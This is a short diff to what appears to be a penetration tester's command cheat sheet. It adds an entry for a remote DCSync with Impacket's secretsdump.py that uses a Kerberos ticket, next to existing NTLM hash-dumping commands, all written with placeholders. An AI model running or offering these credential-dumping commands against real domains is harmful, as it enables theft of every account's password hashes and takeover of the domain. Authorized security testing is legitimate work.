@@ -45,3 +45,8 @@ secretsdump.py -just-dc-ntlm -outputfile <ntlm-extract-file> '<domain>/<user>:<p
 secretsdump.py -just-dc -pwd-last-set -user-status -outputfile <ntlm-extract-file> '<domain>/<user>:<password>'@<ip>
 ```
 
+## remote dcsync (ptt)
+#plateform/linux #target/remote #cat/POSTEXPLOIT/CREDS_RECOVER 
+```
+secretsdump.py -k -no-pass -just-dc -outputfile <file-prefix>  -dc-ip <dc_ip> '<domain>/<user>'@<dc_name>
+```
